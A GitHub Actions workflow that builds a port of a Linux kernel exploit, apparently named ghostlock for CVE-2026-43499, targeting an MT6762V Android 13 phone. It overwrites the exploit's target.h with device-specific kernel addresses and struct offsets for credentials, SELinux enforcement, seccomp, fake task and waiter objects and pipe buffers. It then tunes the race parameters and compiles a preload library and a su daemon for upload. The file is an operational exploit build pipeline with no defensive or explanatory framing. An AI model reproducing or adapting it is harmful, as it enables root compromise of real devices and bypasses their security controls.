name: build_k40_port_m36_FINAL_VERIFIED
on: [push, workflow_dispatch]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Install dependencies
        run: |
          sudo DEBIAN_FRONTEND=noninteractive apt-get update -y
          sudo DEBIAN_FRONTEND=noninteractive apt-get install -y gcc clang make git

      - name: Setup Android NDK
        uses: nttld/setup-ndk@v1
        id: setup-ndk
        with:
          ndk-version: r27c
          add-to-path: true

      - name: Clone K40 port
        run: |
          git clone https://github.com/yijiacloud/ghostlock-cve-2026-43499-4.19-k40.git
          cd ghostlock-cve-2026-43499-4.19-k40

      - name: OVERWRITE target.h AND VERIFY
        run: |
          cd ghostlock-cve-2026-43499-4.19-k40
          TARGET_FILE="src/targets/oplus-4.19.157-perf/target.h"
          
          # Write our custom target.h
          cat > "$TARGET_FILE" << 'EOF'
          #ifndef TARGET_H
          #define TARGET_H

          #define BUILD_VARIANT_LABEL "m36_mt6762v_a13"
          #define BUILD_FINGERPRINT "alps/m36/unknown:13/xxx/xxx:user/release-keys"

          #define KIMAGE_TEXT_BASE 0xffffff8008080000ULL
          #define P0_PAGE_OFFSET 0xffffff8000000000ULL
          #define P0_PHYS_OFFSET 0x40000000ULL
          #define P0_KERNEL_PHYS_LOAD 0x40080000ULL
          #define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
          #define KERNELSNITCH_IDENTITY_END 0xffffffc000000000ULL
          #define DIRECT_MAP_BASE 0xffffff8000000000ULL
          #define DIRECT_MAP_END 0xffffffc000000000ULL
          #define VMEMMAP_START 0xffffffbc00000000ULL

          #define PSELECT_WAITER_WORD_SHIFT 1
          #define CFGOPS_4_19_STYLE 1
          #define KMALLOC_419 1
          #define KMALLOC_PIPE_INDEX 10
          #define KMALLOC_PIPE_OBJ_SIZE 0x400
          #define KMALLOC_CACHE_TYPES 3
          #define ASHMEM_NAME_PREFIX_LEN 0
          #define ASHMEM_PREFIX_COUNT 0
          #define MM_STRUCT_SZ 0x340

          #define ASHMEM_MISC_FOPS_OFF 0x0180ab58ULL
          #define ASHMEM_FOPS_OFF 0x01067d80ULL
          #define ASHMEM_IOCTL_OFF 0x00ac0d84ULL
          #define ASHMEM_COMPAT_IOCTL_OFF 0x00ac14ccULL
          #define ASHMEM_MMAP_OFF 0x00ac1544ULL
          #define ASHMEM_OPEN_OFF 0x00ac16b8ULL
          #define ASHMEM_RELEASE_OFF 0x00ac1748ULL
          #define ASHMEM_SHOW_FDINFO_OFF 0x00ac17d0ULL
          #define CONFIGFS_READ_ITER_OFF 0x00286ec8ULL
          #define CONFIGFS_BIN_WRITE_ITER_OFF 0x002873acULL
          #define COPY_SPLICE_READ_OFF 0x00223e78ULL
          #define NOOP_LLSEEK_OFF 0x001e7b38ULL
          #define INIT_TASK_OFF 0x016fb840ULL
          #define INIT_UTS_NS_OFF 0x016fb5e8ULL
          #define EMPTY_ZERO_PAGE_OFF 0x0187e000ULL
          #define ROOT_TASK_GROUP_OFF 0x01885580ULL
          #define SELINUX_ENFORCING_OFF 0x01925fc0ULL
          #define SECURITY_HOOK_HEADS_OFF 0x014c8288ULL
          #define KMALLOC_CACHES_OFF 0x014c7df0ULL
          #define ANON_PIPE_BUF_OPS_OFF 0x00ee1c00ULL

          #define ASHMEM_MISC_FOPS (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
          #define ASHMEM_FOPS (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
          #define ASHMEM_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
          #define ASHMEM_COMPAT_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)
          #define ASHMEM_MMAP (KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)
          #define ASHMEM_OPEN (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
          #define ASHMEM_RELEASE (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
          #define ASHMEM_SHOW_FDINFO (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF)
          #define CONFIGFS_READ_ITER (KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_OFF)
          #define CONFIGFS_BIN_WRITE_ITER (KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_OFF)
          #define COPY_SPLICE_READ (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)
          #define NOOP_LLSEEK (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)
          #define INIT_TASK (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
          #define INIT_UTS_NS (KIMAGE_TEXT_BASE + INIT_UTS_NS_OFF)
          #define EMPTY_ZERO_PAGE (KIMAGE_TEXT_BASE + EMPTY_ZERO_PAGE_OFF)
          #define ROOT_TASK_GROUP (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
          #define SELINUX_ENFORCING (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
          #define SECURITY_HOOK_HEADS (KIMAGE_TEXT_BASE + SECURITY_HOOK_HEADS_OFF)
          #define KMALLOC_CACHES (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
          #define ANON_PIPE_BUF_OPS (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)

          #define SLIDE_NFULNL_LOGGER_OFF 0x016f1860ULL
          #define SLIDE_SYSCTL_BOOTID_OFF 0x019320e4ULL
          #define SLIDE_INIT_TASK_OFF INIT_TASK_OFF
          #define SLIDE_ROOT_TASK_GROUP_OFF ROOT_TASK_GROUP_OFF
          #define SLIDE_LOGGERS_0_1_OFF 0x016f1788ULL
          #define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x019320e4ULL
          #define SLIDE_WONLY_BOOTID 1

          #define SLIDE_NFULNL_LOGGER_IMAGE (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OFF)
          #define SLIDE_LOGGERS_0_1_IMAGE (KIMAGE_TEXT_BASE + SLIDE_LOGGERS_0_1_OFF)
          #define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE (KIMAGE_TEXT_BASE + SLIDE_RANDOM_BOOT_ID_DATA_OFF)
          #define SLIDE_INIT_TASK_IMAGE (KIMAGE_TEXT_BASE + SLIDE_INIT_TASK_OFF)
          #define SLIDE_ROOT_TASK_GROUP_IMAGE (KIMAGE_TEXT_BASE + SLIDE_ROOT_TASK_GROUP_OFF)
          #define SLIDE_SYSCTL_BOOTID_IMAGE (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)

          #define LOCK_OFF 0x1350
          #define W0_OFF 0x2220
          #define FOPS_OFF 0x1000
          #define SCRATCH_OFF 0x3000
          #define RIGHT_OFF 0x4440
          #define LEFT_OFF 0x5550
          #define FAKE_TASK_OFF 0x3200

          #define WAITER_LOCAL_OFF 0x80
          #define WAITER_TREE_ENTRY_OFF 0x00
          #define WAITER_PI_TREE_ENTRY_OFF 0x18
          #define WAITER_TASK_OFF 0x30
          #define WAITER_LOCK_OFF 0x38
          #define WAITER_PRIO_OFF 0x40
          #define WAITER_DEADLINE_OFF 0x48

          #define FAKE_WAITER_TREE_PRIO_OFF 0x18
          #define FAKE_WAITER_TREE_DEADLINE_OFF 0x20
          #define FAKE_WAITER_PI_TREE_ENTRY_OFF 0x28
          #define FAKE_WAITER_PI_TREE_PRIO_OFF 0x40
          #define FAKE_WAITER_PI_TREE_DEADLINE_OFF 0x48
          #define FAKE_WAITER_TASK_OFF 0x50
          #define FAKE_WAITER_LOCK_OFF 0x58
          #define FAKE_WAITER_WAKE_STATE_OFF 0x60
          #define FAKE_WAITER_WW_CTX_OFF 0x68

          #define FAKE_TASK_USAGE_OFF 0x68
          #define FAKE_TASK_PRIO_OFF 0xac
          #define FAKE_TASK_NORMAL_PRIO_OFF 0xb4
          #define FAKE_TASK_TASK_GROUP_OFF 0x3c8
          #define FAKE_TASK_PI_LOCK_OFF 0x8b4
          #define FAKE_TASK_PI_WAITERS_OFF 0x8c0
          #define FAKE_TASK_PI_TOP_TASK_OFF 0x8d0
          #define FAKE_TASK_PI_BLOCKED_ON_OFF 0x8d8

          #define TASK_PI_LOCK_OFF 0x8b4
          #define TASK_PI_WAITERS_OFF 0x8c0
          #define TASK_PI_TOP_TASK_OFF 0x8d0
          #define TASK_PI_BLOCKED_ON_OFF 0x8d8

          #define MM_OWNER_OFF 0x310
          #define TASK_PID_OFF 0x5c8
          #define TASK_TGID_OFF 0x5cc
          #define TASK_REAL_PARENT_OFF 0x628
          #define TASK_ATOMIC_FLAGS_OFF 0x590
          #define TASK_REAL_CRED_OFF 0x758
          #define TASK_CRED_OFF 0x760
          #define TASK_COMM_OFF 0x768
          #define TASK_TASKS_OFF 0x4c8
          #define TASK_THREAD_GROUP_OFF 0x6e0
          #define TASK_THREAD_INFO_FLAGS_OFF 0x00
          #define TASK_SECCOMP_OFF 0x848

          #define CFG_PAGE_OFF 16
          #define CFG_NEEDS_READ_FILL_OFF 64
          #define CFG_BIN_BUFFER_OFF 72
          #define CFG_BIN_BUFFER_SIZE_OFF 80
          #define CFG_CB_MAX_SIZE_OFF 84

          #define CRED_UID_OFF 4
          #define CRED_SECUREBITS_OFF 36
          #define CRED_CAPS_OFF 40
          #define CRED_SECURITY_OFF 120
          #define SELINUX_CRED_BLOB_OFF 0
          #define SELINUX_CRED_OSID_OFF 0
          #define SELINUX_CRED_SID_OFF 4
          #define SECCOMP_MODE_OFF 0x00
          #define SECCOMP_FILTER_OFF 0x08
          #define TIF_SECCOMP_BIT 11
          #define PFA_NO_NEW_PRIVS_BIT 0

          #define STRUCT_PAGE_SIZE 0x40
          #define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
          #define STRUCT_SLAB_CACHE_OFF 0x18
          #define STRUCT_PAGE_TYPE_OFF 0x30

          #define PIPE_BUFFER_SIZE 0x28
          #define PIPE_BUFFER_SLOTS 16
          #define PIPE_BUF_FLAG_CAN_MERGE 0x10
          #define PIPE_INODE_INFO_STRUCT_SIZE 0x88
          #define PIPE_INODE_INFO_SIZE 0x88
          #define PIPE_NRBUFS_OFF 0x38
          #define PIPE_CURBUF_OFF 0x3c
          #define PIPE_BUFFERS_OFF 0x40
          #define PIPE_READERS_OFF 0x44
          #define PIPE_WRITERS_OFF 0x48
          #define PIPE_FILES_OFF 0x4c
          #define PIPE_TMP_PAGE_OFF 0x60
          #define PIPE_BUFS_OFF 0x78
          #define PIPE_USER_OFF 0x80

          #define FOPS_OWNER_OFF 0x00
          #define FOPS_LLSEEK_OFF 0x08
          #define FOPS_READ_OFF 0x10
          #define FOPS_WRITE_OFF 0x18
          #define FOPS_READ_ITER_OFF 0x20
          #define FOPS_WRITE_ITER_OFF 0x28
          #define FOPS_IOCTL_OFF 0x48
          #define FOPS_COMPAT_IOCTL_OFF 0x50
          #define FOPS_MMAP_OFF 0x58
          #define FOPS_OPEN_OFF 0x68
          #define FOPS_RELEASE_OFF 0x78
          #define FOPS_SPLICE_READ_OFF 0xc0
          #define FOPS_SHOW_FDINFO_OFF 0xd8

          #endif
          EOF
          
          echo "=== VERIFICATION: target.h ==="
          grep "BUILD_VARIANT_LABEL" "$TARGET_FILE"
          grep "P0_PHYS_OFFSET" "$TARGET_FILE"
          grep "TASK_REAL_CRED_OFF" "$TARGET_FILE"
          
          if ! grep -q "m36_mt6762v_a13" "$TARGET_FILE"; then
            echo "ERROR: target.h was NOT overwritten correctly!"
            exit 1
          fi
          echo "=== target.h OK ==="

      - name: FIND AND PATCH CPU / THREADS / COLLISIONS
        run: |
          cd ghostlock-cve-2026-43499-4.19-k40
          
          echo "=== BEFORE PATCH ==="
          grep -rn "thread_cnt\|collisions\|g_cpu_count" src/*.c src/*.h | head -n 20
          
          # We use python to do the replacement with exact strings, since sed is failing
          python3 << 'PYEOF'
          import os, re
          
          for root, dirs, files in os.walk('src'):
              for f in files:
                  if f.endswith('.c') or f.endswith('.h'):
                      path = os.path.join(root, f)
                      with open(path, 'r') as file:
                          content = file.read()
                      
                      # Replace thread_cnt
                      content = re.sub(r'\bthread_cnt\s*=\s*8\b', 'thread_cnt = 7', content)
                      content = re.sub(r'\bg_thread_cnt\s*=\s*8\b', 'g_thread_cnt = 7', content)
                      
                      # Replace collisions
                      content = re.sub(r'\bcollisions\s*=\s*4\b', 'collisions = 16', content)
                      content = re.sub(r'\bg_collisions\s*=\s*4\b', 'g_collisions = 16', content)
                      
                      # Replace cpu_count
                      content = re.sub(r'\bg_cpu_count\s*=\s*16\b', 'g_cpu_count = 8', content)
                      content = re.sub(r'\bcpu_count\s*=\s*16\b', 'cpu_count = 8', content)
                      
                      with open(path, 'w') as file:
                          file.write(content)
          PYEOF
          
          echo "=== AFTER PATCH ==="
          grep -rn "thread_cnt\|collisions\|g_cpu_count" src/*.c src/*.h | head -n 20

      - name: Build with NDK
        env:
          ANDROID_NDK_HOME: ${{ steps.setup-ndk.outputs.ndk-path }}
        run: |
          cd ghostlock-cve-2026-43499-4.19-k40
          make PROJECT=oplus-4.19.157-perf NDK_ROOT="$ANDROID_NDK_HOME"
          
          mkdir -p /tmp/out
          find . -name "preload.so" -exec cp {} /tmp/out/ \;
          find . -name "su_daemon_aarch64_pie" -exec cp {} /tmp/out/ \;
          ls -la /tmp/out/

      - uses: actions/upload-artifact@v4
        with:
          name: ghostlock-m36-final-v2
          path: /tmp/out/
